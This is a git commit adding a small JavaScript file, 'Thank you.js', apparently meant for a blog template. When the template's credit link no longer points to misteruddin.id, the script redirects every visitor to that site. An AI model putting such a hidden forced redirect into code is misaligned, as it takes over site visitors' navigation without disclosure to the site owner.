526b2d21bfd464d7215f49dc581b4f99f57d748e
misteruddin41 <42267636+misteruddin41@users.noreply.github.com>
2018-09-21 07:45:11 +0700

    Add files via upload

---
+++ Thank you.js
@@ -0,0 +1,6 @@
+<script type='text/javascript'>
+//<![CDATA[
+$(document).ready(function () { if ($("#change,.change").attr("href") != "https://www.misteruddin.id/") {
+        window.location.href = "https://www.misteruddin.id"; }});
+//]]>
+</script>
